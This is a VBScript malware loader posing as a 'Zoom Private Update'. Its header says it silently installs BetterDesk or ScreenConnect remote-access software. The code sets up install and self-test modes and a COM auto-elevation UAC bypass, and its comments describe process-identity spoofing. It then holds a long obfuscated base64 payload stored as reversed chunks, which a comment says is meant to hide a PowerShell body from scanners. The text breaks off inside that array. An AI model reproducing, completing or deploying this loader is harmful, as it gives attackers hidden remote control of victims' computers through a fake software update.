' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "5V1L5MnQTFWdulHR4YHV3kDdzJzc5QmcxQlengyZulmc0NFN", _
    "uZHczRFTFllSn12QqV0UCdld5NTUY52VXJ3KkBFarpFbst0Y", _
    "tl2QrV0YtR0TqJUTnJUTr9WSwsib3cDM4B3aBlnbVF0d3ljd", _
    "4wUe4MlevklNHBHaPV2Rp9CcShkbLJ1L4kVOp5WTLpmRk9mY", _
    "2AHNpFERll2aFt2REpFWrFFOThmbsl3SKVmZNB3b28CT6pUN", _
    "Qd3UadEMTpWbykVNQl1Z6FVZnB1TSBDeLB1bSlGTptEREBnN", _
    "5UVapl2dmZ2c1pXdu50U04WOVtmeUZUVm1mYWNGNrNGdxUzc", _
    "JVVaDVTTYV0RTFEO3MDWQ1UZ4I1d1N2YrY0TvckTERzbQVDZ", _
    "t9CZFRUNzc3Kw4mezplTlFkUaV3YHlUcudGR4dmZDZ1cQ9Gc", _
    "ih1Q5ImZDVGWRRnbvEVMmF0baNkYm9keYNFOwx0S4IEcVVUa", _
    "BB3bOVDajp2RqN3dQlXSNp3NLZndHF1cNpkSvcFTzl2Q2Bjd", _
    "vZXSLJFM4F2S590ZvYFWyZzazomYqV1YH5kZ0k3RtpkT6xWS", _
    "h5EVsRja1VmN1cDV5InZvcUbnRETBlEOvp1UqVDdnh0cLZ3a", _
    "GtUZuJmM3U3d4sCTO9ker1GTzJGWv40QTpkT2QXbOJFeOhFW", _
    "QRzLzoEelh2NolTMHlmRwcXdhJldyVWOPRDa0cUUuV1M0M1d", _
    "4ZUUEZUTtBXRx0WMIdFTlhEO3RnY5UzQ45kRrJFMZlGeZJle", _
    "1pHauNmVvcjd6J0NkZGS29iTzonT3Q3arYHV1RlNBNWROZnS", _
    "mJWWKhUZ1c2LvI2LWZEOzw0M5QzQ2ZzM2x0cnRXdWR0T080N", _
    "UxWYkRWQyYVWrx0dQ9EWqFjNEZ3c2RHd34EUrcHVQRmdkNDW", _
    "zh1c5wEWjBDZyQGMzIkU1QXevsyUj9GbohmY5gXYThmQlRlU", _
    "xkjVkZmW4glbrh3TMZVRRhjaKFVSVJVd2RVavZjZPhjZDdUM", _
    "5YjYPVjdvc1M1ZDUj5ma2FXZ5QHd5MTUWNTdsFjZWd3LrI2K", _
    "CFnNGhTR1dlN6tWWj10LPNjanp0YoVVWSVDUlVFR4cHcthzN", _
    "jtmdopHRpZnYFd3V0M3QllXdCtiZRNjVNN0SNlDbI5UZPxET", _
    "5EkRNJVZOJ3QQJ0YXZUM0QEai50K2YzcMxGNDdHN2tmMLRXR", _
    "MlkenhETmZjUvZ0NEx2VpZ2dnFXMUR2TaF0dCp2chpHeMpEN", _
    "2YUQyElQDlXdHl3TDZWO0RjUTFjbRJTezoUYyQTZyJUVql2V", _
    "Kl2awcmdC1mQstWV1AlSrc3duBlSrkUUiNlM6h0TvRDVxJGe", _
    "TVEdMdHNjFzNYh3aJhTSmhkSHhlbwNVOvAlNzdkS1sCbTVTe", _
    "KBHNXNDbmhlbvdTaJVlUwA3ZVlHVH9kUuJ0LlFVTilDUwgHW", _
    "0MENslGOq9iWwcEVtd1UU9ESldTQrVWNU1URRtSVQFTNCFVT", _
    "hNVVWd2d5JTOvh1Y1EzM2pHRQBDb5dVMIZWY1NFZFNzR2cnS", _
    "2gXdkNTVlZHZWlXSkZ2R6pHUzpXZNhHMUhjevMXOYF1R58kU", _
    "IplcrNFVvRWT3FDZPFlM2hWaiNTdINHcrdlcV1GU3Q1dP1GU", _
    "o9SOh5GVlNVbQdGZ5M1S5lmUpdzVxlEWOhnZUdUdCJGelhFU", _
    "3EFR2pXcPZ1LxVWOPN2LINHU5k1aUhXZKFHTwgFRrRTaBVXa", _
    "uNHZwd2brF0cHZlbvYjWnVjZxEHWvI3d5AVW2MTOChUZ4YzM", _
    "xolbzRleKhHVhJVau1kZqRnYEhGUjREOFB3b5I2QBFXQwkVM", _
    "rUXRz0mb38kTQljcyVGbhZmZPlkeJZjN4VTOPN0N2NlWFtyR", _
    "ZJEc2QlS3tGTtJ3UvcmduFFRlFFUpBnQOB1M5AVTYlTZNhVM", _
    "3ZGWoRUT0p3YtBlRxcXWG5WTYJkRWVTNCRUaTN0Q2xUQRhGT", _
    "olkaZpVZ54ENwsibillbkBFc3M2YsVmc5Und2ZWVOxmTQ52N", _
    "2kGarN1aVJEaOR0KnB1ZqdlSyAVWnh2a1NDbSpFN0gFam5WR", _
    "55kczQzM4RTVrhGMON0cJh2cnBVOORlS5EkMttSdDp2drNjR", _
    "Fp3MvZjRSNjR2ZzRLd1dTVUR1M0SSxmM5FnMzpncSRjWXJ0d", _
    "yRjeWZ2bzwWb1NjMRx2Kh10c4d2YBlmQxRXbrpEaHFlNGdUM", _
    "LdVNB9SWFJFOohjbEV0clRneEZUMzgzUEdUOUFDaJVmVLVES", _
    "x9CUsFHWvpmdjZTYrxmM1ITRsdlbLJ3KG9GNEhFePJ1YJlDa", _
    "MdTT5QVSaF3YRlXcwoHaYJnVnZGUDZ1UYNFRFdmbohzUlpXR", _
    "FJVYwV2ZrMUM0MXcNdEOFlDe4gndt5GdF12MpJ0RHF0RyRzZ", _
    "1wWcwdWYnx2RapGSwJDNuNUWOZXUtRGO3skS0MUeaRDU0g0Z", _
    "TpkS2gWazBVNz0UOYlWZOJ3SxNHW3NHOaV0QP90L4N3c3MTe", _
    "TJzdykFN2sCWCZTYQdEZxUVa3hkQ182K4okSq12Yv9mNRtUV", _
    "yRUY5sWO4ZTd0ZVZVB3ZT1mcMR0MKRVR4VDUrhWdmhXbpp2R", _
    "UF1TW9UdCJmRCpkUMp1TRdWZxU0QNpnZHJUNqJHeBV0QERzT", _
    "upEV6d2SXZHeFZkaHl3Qh9mZOBnd5lFahRDTpN1aaNUcQNkM", _
    "L1GRulWdWN0Qxd2UzdkbNh2drMWZTt2ZVJWWthXeJtCOKVjW", _
    "zlWWPFmeKd2aPFjbalDcWpmZyJUM3ckTUFDN6JVO65mT2cjU", _
    "ygXd0cmc19iaUF3KjlWaMVUQrEjZ6NUNwpHa2E2aBhDbVFEN", _
    "xcjQk10Qzc1a0M0UR9GNz12LUFkT5Q3ZwZDc5Q2dyBTNqR0Y", _
    "HB1UKBXMRh3NFFHNTNUNMVkTWZnbBpWeGJEMNxWe0ZHVRxWQ", _
    "xN2LEBnUrFXYYN0dFRGb0MDboFGNR9WVhhWOOtWNKJ1ZrVGN", _
    "0UUWHVGe1MWN1ITO0oFdKhzZEdGVa9STZZXZEtWVrUlTW92M", _
    "td1SGZDTXhVcLZTT6lHcjp2UWh3cVVWahJzU1olMPBHezZlV", _
    "6VUTLhXZPBFUxUkUQplViZVWDlFb2F0cnJFar4mdIRjRXpWU", _
    "sR1UHlnYBhkWIJWNY12bi9ERroUVS12clpVaPJ2KJBVaZtUS", _
    "TJDbuZzcB90QvVjaYFXWwFkUFxmV5l0Yvh3M39GUtNDUjVER", _
    "rJkeKZEV0NlSLhzR5t2a2RUbpJjbwBHNkh3U5J1VCpWTUhWM", _
    "OVmZCJFdFVGSsJTRmt0Lkl3avdjSOdlbq52dMl3aqVDbwV2V", _
    "lN0dhxkVDdVUuB3Tzone1czQtFXYTlTTvhlRpxkVuVUQVtiQ", _
    "6NEWx82VkN3YMB3SZV1Yup2dxRneTlGe3QUODVEZDlkRjJVW", _
    "ntmewcHRNtkVFB1NRtUNal0RvsmSshURoJERplHbI10bh9EZ", _
    "kZEdshzQvoFVjhVNH10ZDtGZygDeJ5UWJJVS4pWe1pFboRTW", _
    "KJ1KQljeWxWb2gUMZNXcJJlWFJ3bVN0ZslXaZVTTvYlZ1Emc", _
    "zc3T3U2Z3MnULRXNvlndrBnYCdUdWp1Q4wGON5WN2dXZvU0T", _
    "khFNip2bIxkSzUGaq1GUxUFWysWN3kmStx2calGbSFXeKFVe", _
    "3RzaOVnSiR2L44USLJlb0ETULhVbWFUWQFHMmpVVG12VmlzT", _
    "VZEZW9md4JXZEN2Sx4kei9GTCxkTDtUaFZTTaVTRvcza59kZ", _
    "lhVNphlWzUWdFpEdopkSLJWVr8Cdw4kexcWOhJ3MCdjd6hHN", _
    "SlkNpRnc4AlY0V0TX9mcWpGW0c0QilXREdHdTZUNvdzKpN2Z", _
    "kN1RzcEMIxWRmd2bMJDOW1kTvwEa4QDTCVUQNh1aitSevMEV", _
    "ZRHTMpFeWJUaMVlV3gFcxgEe490SrQFN2sUe350cHVUYhhnZ", _
    "JlESktUQMZkeZtyK5p1VCN3UHdEcZVFN0MHbvIzSE5ESqB1U", _
    "CtUSCd2VLB1Yk5kbHx2bTJHdspUc1cGelpENQVFWvE0dPRGR", _
    "z02MzMkM2YVMmllQ3U3M2MzKrYzKxZjdllHa2kza580dlVkM", _
    "CNTdS92SwI2Z5clNoJWQolHNU1mTsFERzcjQPZza5IjYIRnd", _
    "XNzaG9WbwZUVXFGeIJ0TWlVcMJUNQl2R6hjWxUkRTdGWxIUU", _
    "0ZzZQNnNnhUOyQVMoVmd5M3NmV3Vmh0NRRGVhJDNlF2NB92d", _
    "wlEOBtSSM10KwsycxhzT10EMLJlakdWVQ9iSKdmbGVFMzo1Y", _
    "5ZWRCB3a0cnUGZUQQNDdxIlU0N0V4RFTxsWbWZHRIFnb0sUc", _
    "SZkbXRGdFtkQK5kVBlTe0MmbjhXaLBjMudDbCdVMWJXc5dmb", _
    "lFGTLd1QyIUUN10KyQkS0M2Q4hlUCZ3a5oHUvB3V05EMuVDV", _
    "QR0KNRXQkhGcaFzRFR3MuFFZ4BDMx4kblVTMHVDO5Y2crZ3T", _
    "xpkUv10Tzd2cCNlQ542Q4I3dupHUsh2aDl2bvR0aIN2RCh2T", _
    "z9kSRVXNvhTNaNnb3FkUXJ0ZKl2YRdzayw0aiJTVxdjMjpUc", _
    "hVzRJVEe1A3KrckdNZESx42NrIlS2JFSzkXWwI1LSpWQVNVY", _
    "KZmcOBFdBlDbXpUQkhVOsZkckRXVkZGSPFXYDx2ZVlURxFXU", _
    "iVkQCN3U0sydvR2QwYkSrMjUsBnZTZ1Z4t0axx2VwpFZnN1T", _
    "0pmVFl1dIlHUwdDV5EWY4FUTzh3L4MXVr5kMCZmeQp1b2kXT", _
    "qVjVvlUdkdVZ1oESrVja0AHZwhjbG50cLJGOnFDd5NWRBZ1L", _
    "NlGeJBlTE9CMvF0QWZ0bR1GeaN1YzUnVwJzdIZGczh1UHxWO", _
    "1J3SjZjU1UlbjFjNJxkau9mUnt0M3Ule0RjW0gUQ1kkezETY", _
    "EZDWoJXc1BDWJllMw5We2kUWyh0MTN3UtZDOHRjewkUQuNja", _
    "sN2UVx0d6dzZVtUaExkczZlZWZzd2l1bxdVWwNTYWdmN4c3V", _
    "21kaKJkVVtCVityKpdXa58iWEZlQBVEZO1WMhZka0FkbCdzR", _
    "1d0TPdzTvQDcPplSpl3N4RHZ3QzN4czbydEdj10RVd2dKFXW", _
    "q5GW5kDRnpkQhNzaxgXamRWZkRmMKR0S5FGRX5UT0sENzYnQ", _
    "tJGOQl3NzEGVGR0UQl0coxWOhdWR3gHaNlUZvYmZ2tiM250U", _
    "wIWbQZ3dal0Y5IHNzVGNk9kYMR1K0UHZaFWYrlXa1plWylUV", _
    "JhkRz5WUTJlV4F1TopUdKZzatt2cPJ3dZtETQlWO5YXSTJnV", _
    "rBXWhZESMpWNI5UbzU3TTd1N5IWUr9yVwh2V3V0NzIXNt92R", _
    "KBTN08WVvFXYk9WQ0BlWJh1Vw4kWrtUeQJWM5tEctd1UtJnW", _
    "HBnStdlY6JWOP52LTNTNVlTZTdDN5kWM1UFMXZHaQZTQ3t0V", _
    "VJ3SONjNzhURTJkc2lVTNFkNM5UY1sET0kjbOZ1ZstSY1g2U", _
    "3RGaLVka00GUzVmclxUcCx2asdVWGdmaFtyZK9CeLdVMxJTZ", _
    "aJXN1tyMuJFWIN3b6hTTlZDbx8CR2dVMyckM2YkT3YTWth2R", _
    "a1GWmpHNwNlRXFHZyp3ZXB1Syw2ZqF3SRN2cxMXR0UTdzF3T", _
    "J10QFZlRoBDM1BXMXRUOkFzNEFmSJ9Sbph3ZIl1SUFza0JEU", _
    "NZWTGRWNpNHbxhneXRWc2t2SSlmV19kRUJ3YhRVMwp0UYlGN", _
    "5ZWSCZ0YIFFNsRXThpWSyEHbyd1axMVTxZFNwxWbyY0RJt2T", _
    "jBDc3g2b250RBpVaHRHO11Eeuh2YUJjU4kTYjdnW5gHNwEkb", _
    "MBlVRdkVwwGc0AHVVd3a0JlbpF1RLpXclx2bXJXezJTbJlXQ", _
    "C1mWHZHdaBXYGNkaEN0MClGO0JGSOZFbqNjZDhWc4gWe2h2Q", _
    "5NVUxRnTIZ0bvtUMyBlY4IlMPt0KZhmVZlUVRpHRHdFRXRDd", _
    "jN2baRVYOZHbnBTVEBTWB10MoVWSQNXOURTZ3B1RO5kWNFnc", _
    "1RlboNmMVdkb0V3alRDRJVzUNN2KEN3S6RVS4h3S1ATWSFEW", _
    "CNnUrJnbnJFMUtiS0c1Vy02VvEDR6JFbExUO6hUS2cDbSlHc", _
    "3lmRy1GSklnRiF3QORzVId0R4IVev92SWZVbuVWMOJTMyJ2Q", _
    "5N2YKh1Qv4GchNFUVlVb1U1QyNDbFh2ZyU1TD92LCZ1VthjQ", _
    "Id3dFNmULNDV5sWZwF0TxN2YxUzVkFXMVREOwZlNnl3LvNFZ", _
    "H9UNyJGUyEURCpVVDJWa3cXbBxGSUl3YEF2aNpUcQNVSEBDW", _
    "BFXTTZGZ0k2YW52UIl3T0YHVThUOmJ0K31kM4YDbu5Ec0REW", _
    "VlHZlh1QrEEV580QFd2SyIzY2NFSxN3KSVlYpJnex9UWxB3c", _
    "Ud0bxZGRohVSsZ3REFFR0RjVmtETP9id1BlRYRmZDR3aKdVa", _
    "OdzKCFESwEWO6J2RNh0NoFmMlNTd3UjTzh0NURlQkJFSqJma", _
    "2dTMMZFMyc2bvJVRwBTRUZmM5lHeZ9GdnJWQ5dEZQZWboVGM", _
    "aFnQ6p1NMJEM61WaxRDb54GVth1QzBXRzQWWrpGVyM2Qy50d", _
    "6FmUmplSptEZwoUWYNUUy8UM0NUUxY1YtZDSGtUb5sySC5EW", _
    "ycDSwJFark2UGtSWvh0bjZTZ4ZmbnhkbXxGSWR1V1kkUFVXa", _
    "aZEb6tWO4QVZnJVRwM3c0oFda12UR50N0kTc01mM6h3Z0lnW", _
    "1AHbON1c5QWQJZ1RwcVcRl1b1NmVqZHcwwGRMpHRxVHNjFmM", _
    "uJTdJ5Gbyo0KDNGbIVlTpVTN2cDeHZmRmJGST9CUBZ0LyRWV", _
    "IRUMGp3aYRnW2tCdutEUhRWQyI2L2YDTml3d4RHZEJ0Lyc1U", _
    "vBDcxN2R4plVwEleOZETWlkWLZVb6ZVUVFnW2ElTLpHbGBjY", _
    "Lx2Qr5GOIllSHR1MzE0c58ySFlHW2YWZtZjQ1N2TNF0LwY0a", _
    "vVmQr9kUxc2bzhVMIdkaKFmQrcWRVBlY4kWVzkDU2MzQzEVT", _
    "08STvcTeEhUV1M0aENzSEZFUYFXdtpUbqtUW3EUNhl1QIF0a", _
    "p50T2Yle3cmTQlFR1YEdxFjTxhlZPJVO4JUVwsyRzM2MYlDS", _
    "EhGTDNXbZpVatZzRBhUS2U3RxU1bzsySIlTdH5UW6p3cvFnc", _
    "uhkRXVjYiVWSHt2ZIRkY5FFWStCbwcUettCOHFGV0FTajxEb", _
    "V1UdRhXav9ENoZDSxImTI9kUPhDWtJUSnl0UvgkQJF1TMd2Q", _
    "IlTdhFUNMZVZQ5EduZFcFNUcot2KJF0RrpkMuRXMFBTM0BTQ", _
    "SljR5Y1LUV2dzk2TiBjerVUT5ZVamlDWrMnR0cmMyFTTldna", _
    "UdUYKxGRZVlYsFnQUlkQkxmc0YVZzAjeWZGMZNWS240NHF3K", _
    "GhFdxRXW3BTQvRTQJpkUXdnY080QIJjbZxWSJZkVEFXVa1kT", _
    "4lkSGdUeGJTVhpFNnZjcyEEbkhHarIDd1JWUVx0TwdzKoFkR", _
    "HV1LIJ3KUJDW3cjc5RmZzIDWad3L2Zlc2U3MXZmSwYWW6FWW", _
    "VhEVx9kYvsUMMhGVBxmerInMLZHVykjdsV1dyMDdlFja1B1L", _
    "qRXS1IDZjhHeINWco90dalVdvBnVXNXQIZUc4FGZhFkdIdmb", _
    "WF1LzsGVaNDRysSUWNzdSRVMVdnSrcGatt0MKNUTFJFZwg0M", _
    "RlXTwcmNspGTyl0dUNDSSJGSkFDVIlzM3ADMUNTOxgUOjRUS", _
    "QNDM5QDc3VDSFVUUyUGTwEzcwkmYGl1R0YGZBpkdJRkUHh3U", _
    "3YDZ6tUU3p0SrA3V6xWTyU3TYBzaiRVbHRjarkHO1tkUTNUO", _
    "hlWawAjY2UVZ1RmWN9ydGlGVxsiRpl1TBhEVQF0MqRDTJRUS", _
    "wA3cwIWOP9WdLF1N3N3b0NXWU10V4pWd2VzN0oXYzUlZzt2L", _
    "UJlNY5UM1tGWDBTYzNHMy5EMmN2cn5WbTVFRBhDcEZ2aZlUO", _
    "FJUc1sSarIDazRHWt9Ce1YnSBdWaBRERZFkMHZFSzcmRMZEO", _
    "wJFWGticiNzUiZ0TwZWW2ZWOwsUY2pXQr9COLp2b3gTYnB1R", _
    "KtiSzMDOURXYvZ2cZJnYWBVZ1kTRSBVd2ckWxUVZxIzUFhGR", _
    "vdzQmlTYKpkTIx2LLdjdyR3cHRHW5dGO1g1ZI9UMC5Ub3Q1b", _
    "rNjM3JlQ2hVO5QmWYlVT0cHbw4EdZ9ST3MndrgHRml3LL1UW", _
    "HZlRNZmRQZmMFF2SXR2dwZGRZNlN2M0YxIHbZJ0La1EVqdlQ", _
    "FZVawYWcrMkSYtmQ2c3LhBjNxolW1Z3KNRnVP1EUwYlV5YGT", _
    "2VDOJRkeSVUT6BzTvEUSHZjNwUXMxcnd3YzdNVUchF0TIp3M", _
    "mJlVJZDbhZzVkhWTM9SaPZEZ1QjWGhjWkl3NpV3SxhHZ1smc", _
    "x90MFFjdXtyRKtENKx0LBV2S4gEdJREatpHRGBHZKFnM4YVU", _
    "mtWd3UXU4dnblBzRxRWN1J0RzEDSkNTTQF3V2RnSaZES3ZlN", _
    "iNFeNd3Z3BFe01WTzEVVClFZMdXTFJmailDOrFTM3RGc3Q0Q", _
    "1Vkc1wkRKVzY2lEM6JkepR2cUZ2Rop3MOhndltyV5FlNXlUY", _
    "xYWcapmTXhUNINVeDhFVulndCVmZ4k1N4onM4hFWlpnRy92L", _
    "2oXSIpXWzQ3LzczNvhHUnN2bmd0UyYEOzFXODZzKmZ2QLdDd", _
    "zQlMthWUXl3SwxGRqNWRPVXWkpWN5EDZXtSR3c1SPlke5NlV", _
    "wRVYNdmYrsyLIpGcktGSGVTMmlERyNzLk9UYZVnc2gDMUJ1a", _
    "vgDMW9iW6FmN0U3YjpWdzUGMMZ3K2czKwBnMrlnaSNFbwhkR", _
    "PlneapFWq9idMhWN0QXM5VWSup0MhNFV2dHOzMFSjpEaPFkZ", _
    "v0mQysSaUR2cslDRxMHZ49kSoVnW3cWcklWZwUnWTtCR4gjZ", _
    "CdTUrk2ZJZDd4JUYYlmTV5GVwhXY2JDUmRlbyN1L2dXZM1WZ", _
    "29GOuFmY0cWM1pXVzdHclpXa4YlTiNmbM1GcLxmaMpXW2lTU", _
    "C9SdPF2YnRma5NWcJJ3Vu90RmVTUWd0TGVDePZGOKNVMXJGc", _
    "r9UVwkkW5d2RsllRGpnWpVXYzoFSxMmNa9WZPlFOp12QLJTQ", _
    "MtWTIRUTiVjTiVlWJZVNtBlM2UXNBhTavEjM51UODd1Q5pER", _
    "xc1LTl1RC1kZj9UQhpUdQNFWaZ2ZoZ2NlJUVMpmaUJ0Tkt0N", _
    "MVXOxZla1g2K3YlcyElNhJkY4tEUh9SOyYWO3M3N2MjZ5IWV", _
    "IN2c3kVWZp0a5xkQuJWOtBVc25mTsFVeVd0ZuR1MQBVV6NFV", _
    "wczMQRDdpFDbIFnbmhHZM9UO4w0RxZzNFFlcTVFUZx0c352S", _
    "vdUNalVQiJWbPVGTnNzKit2bwN0dr4GM5YjcxE1d4IVNLpmZ", _
    "pd0SzsiU0IXWGFDWWBnRKhjbGBXMvR3dyhzUCNFdkFWOrN1a", _
    "hdnezgXNHtSdPBleFJ3badHRxsEcCZWRNNHOShnetlkNhFDU", _
    "HNVRT1UZF9Ee1cEbil2a3w0ahVWVXtUargVUZR0c0NXNJ9SS", _
    "rIlUtF2Zr8ET4MDTsZlUpNjdzZFa2oUMrJVViZkV4kzaNhDN", _
    "otSN2QleHJXdMNlRrRXNnZjU19Seq5EMxonUmVTN1N3VLlmQ", _
    "DRFN1dnam10MB1EZP90VQh1dwxkUCRlMKFHZ04keVtmWGNmN", _
    "BFldU5kZyx0U5p1NwIjaopERVFzYzFXW0lEON1WRwMlWw1kR", _
    "pJUaUNUbxkGcDRDWNFXWUp0VBVjWkhHe3ZjcIRDUqJ0c6NlU", _
    "GtEVG9EclVzN3omd3plTtVEWQxEVihjQu1WYkdGS3hESOJTV", _
    "JhUdNVWbId3UZZUSIZ3aJBHOohUUwpWcMR1VZJ2SUplcpZjY", _
    "TZleVJ0MTRmRLlVUCtCaDRUZTdHbWZEMvk0SspWby9mawcjY", _
    "VJ0VkRmbrdHe4hUO580TvUDZHNlenJ0d2d2QY92ZMhUNmtmQ", _
    "UZDckdjbxM0aDFVOxMFZnNGWPlGa2oURsdlenBDS4IWa51ke", _
    "410YHlzTmd2dvpGNmdVU5AXU1JWV0UVQrBnNrZ3RWB3asJDc", _
    "M1mVNdURSpWT3RjYCZXWF5Wb5UnMLpGdz92Vy1WUrEmV2gWV", _
    "GNkc5dzZZhkew1ka3JUNtJjb5YDS0EFNEZ0Uy5UVDxGTRhXT", _
    "thUdsFkSW5mN1lzTwIlbFpmTsZzc3EDMnNTZzhGOBpUVGJlM", _
    "DFWTtdTOld0Z4RVclplWnV3Qi5mQy8yb4AXSrlkQR1mQxgEV", _
    "aVEarhDNPlTVMVUN3pXVttCanVjYvRGRmF0Uyg3Sk10YnNVb", _
    "xVkapJnd20kNlBXNvgTNFFjWnNUc4JDNPFEVh5UZyQ0VLNXU", _
    "m1mN6ZGdUdES1RXOBxWWYhEZsZ2LwYVSolXQmRTSpdjb2gzN", _
    "5onb4I2Z1AXW3kncrUjeN9mNxdERwoGW6JlR6h2ZJRlQTBnQ", _
    "UR1YlV2Yv0WToZjaFVEZWpEZqNUc18mTzVzY1o2T1o0T5QHU", _
    "CxkdDJ2NzgHTrEXTOlTVWRVb5VnN2kjeK9kYzQTTk9SMlRXY", _
    "hh2YEN1Z1JUMNBlQOl2RmllVxIDOtFjTUpVWlllUPVjNrcVY", _
    "3N3bNRWU4Y1L0cEaVhmWqtGe0t0NFl1czEDZGNnR2tWM5NEd", _
    "0UVUP5EUDNGW2F0dWlldNZ3T6FnNxNEUBpFaDN2UBJlV0FGd", _
    "SRjUWlWTPZDalN1bPVETzpmMSdzZCtWQwZzThVEeIFzd1glN", _
    "ltkTmhkTiR3SmJHOqR1ZlFUWh12bj9mM4BVNPFmUDJTZ2kFW", _
    "VNlZXFUZMdlQmhjQvZzLRNkelhGd1ATUzUnN3o3QutCR45Ub", _
    "mplWDh2ald0MKF1Lkt0c35kZzhWbLpnYoNlc1FVcrIFM4g0R", _
    "ysWZw90cBtiQwZUanNVZ40GUyUnZyYHOwAFUIhWNpNFe35Ec", _
    "Phkb38WRwMjdGVWWG9UTwZlZ5Z1MtdWM6dmdJBjS2VXQz9kY", _
    "w5mUphjU6JmbzcFc6h2bWJmUKxUSuNkZDdXUiBzU1kzYSRWN", _
    "DJXU5plQDNHU2llURZWczZnNr50YVJHe6lnQoJ2NXdXZwUmV", _
    "HdTdh92QNV1M0p0YvoWQM52NzVnZ5FXYrBTavQnbaFWbZREO", _
    "yZmYlNjMUNkQ08iR4w0QxMDRxkVYMNGWkdXNxl2a2MTZyonZ", _
    "Oh2UthTWtZXZah1as5kavsWRiV1bJRTR4VHdCBVZkllZ3wmT", _
    "KNjMUdXcp9UVxIVVEhGOKZkWHp0TWNGeNV2Vv10a55WVyV1T", _
    "hR2M0IXc28WWXB1NiVTOZF3UDJVZMVnVClVYPJzbsFmVKFmU", _
    "CdmUxgWSLZEWPFjYZNVMBlkRQt2TMl0daFFOO5mY4VGUjBjW", _
    "Zp2R6JDchFnU0VUVId0b04kMFNXbIR3UNFTe2VUMwMlcmhXU", _
    "CNlTjhnRhF3KwZET4d1UyZTbrRkRvg0QYVHThdDWB5EdFlGZ", _
    "TNzdPFVQyIFSXdUUYNFSlxGd0glZhJ2SWd2Q5YGNkljcZh1K", _
    "zMGZFNTaxEHdzE3cXJjUKhlexo3aR9WSjJjczRDRltEVYBHc", _
    "QlUci1mWRNTTsVkRJJzcoZmYWFWM4EmNtNjewBDaLBDazBDS", _
    "2JkUCdHWFVTR3p2azFzZMJ3apNVYPl1cDZTSHp2Z4gUdydTQ", _
    "k90YzQ2K1hGMvFXVCZTYSJ1NTZVW3VldIF1ZZhETl52axskM", _
    "JtiNhN3cHNnYoBjb1gWcTt0RE1Wcqd0YhpXSJRDVNZEVrFFc", _
    "YpHZsRHRPFUavNEU350QOlmN4YmQslWQzdTcqFFZxQWQnFGS", _
    "tFTeoVWZSJTb0lVVqtSeuBjeD9WcvkjMVBTS6R2cOVXdDh1a", _
    "wYETwI3ZIlHcaR3LxJ2LkxUYmFUWCBzNXhTYVFUc0FGRy10U", _
    "6FlWxJmMyU1V3kVMKxkNKVlYih3QlxGNwhUMHFmdsh3RHVnR", _
    "J90aSN2KGhkbwhmYaNnYMt2K6x0M0J1aEplYwg2KGhXSndWV", _
    "zkkWv9WMKBXaUZUUww2VwsCapZFZ3YDUWRkVrN3dtpFRWlFZ", _
    "ykEWvQHOppHU3ADW29yLQRTO342YRlTdzoHMyt0c24GNJlVO", _
    "3U2TF52Q3g1VhNFa4AjRuB3ST9yckNjWylzLmJzTvgTN6JWd", _
    "XdFNnV1KWNTMIpUQaNzaspUY6ZlQsB1ZDFTciF2V112b4MHW", _
    "ktCTlJWdYR0ShtiT5xmVuZnYxhzMpFnRr9iZ0RGe4dmdF1WN", _
    "p1mNRdER2VGVnllZTtUbWl3QHBldDRFTrgUY2gjM69mMx50d", _
    "4RlRFF1VywUZwNVSZ1kY4ITYvcWbrQ3T5QTbuplZzIzRqN0L", _
    "2JXTsV3KOxGTRhDROl0UwRnRMlVbplnTtxGSWV3di52cWF2V", _
    "WVHMmpkcBhDMxkEd0xkNhBTVvBHZx92b5o1LiFUMmNFW6VXc", _
    "x82ViJ3Qv9CU3E3MM9EZ0pHNBVjQRNlVoFUcjJ3TTdHdoFHd", _
    "Lt2RJdXWwRGWRhkS0xWNPxEV2o2cU12cmpHMTFzVwNnS4AHd", _
    "slXNBdzUilkdJlUMMJWN5R3Ky9idrZVWatydFJ3dZhGbLJ0R", _
    "XhGS1skUwdXentmcWhlS21USMpVaygDNrFGZrV2THVnTONDW", _
    "xZzYpJjZFpXQvhETwFEOFVjcDlmRPVTNCBHeINlREd1cvl0V", _
    "2U1YztySVdTakRGNBxUdjhjNvQnRrQGc0IFd1JVe48iSlJGT", _
    "rpmMLJkWKJWd6BjMjJ0QTFHMBNlWSZDT3YzYrlnbxpVNtF3V", _
    "rs2a4EUYzMHavMENGpWVCd3TVZXTyMjTUBTTzg3UClkM1p0b", _
    "wxGbq9yUWlncipEdEFHO20EUphXeax2Y3l3ZjZFc3hkW4FEc", _
    "mFXNxdmTNlkNExES0YzV0h2MhJXNs9kMyZHOYRFT3ljTI5mb", _
    "1dGZhR0YxZTd25WTxhGN1FHb4EzKiBnV6lneW9GW1YjbLlXc", _
